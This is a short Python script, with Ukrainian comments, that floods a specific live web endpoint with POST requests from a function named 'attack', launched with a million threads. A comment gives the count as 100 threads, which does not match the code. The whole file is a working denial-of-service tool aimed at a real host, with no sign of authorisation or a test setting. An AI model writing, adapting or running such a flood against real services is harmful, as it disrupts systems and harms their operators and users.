import requests
import threading


url = "https://tzi.onrender.com/submit"  

def send_request():
    try:
        # Відправляємо POST запит із випадковими даними
        data = {'name': 'Playbook_Job'}
        print("Sending request...")
        response = requests.post(url, data=data)
        print(f"Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request Error: {e}")
    except Exception as e:
        print(f"General Error: {e}")

def attack(num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    # Чекаємо на завершення всіх потоків
    for thread in threads:
        thread.join()

# Запускаємо атаку з 100 потоками (кількість потоків можна змінювати для більшого навантаження)
attack(1000000)
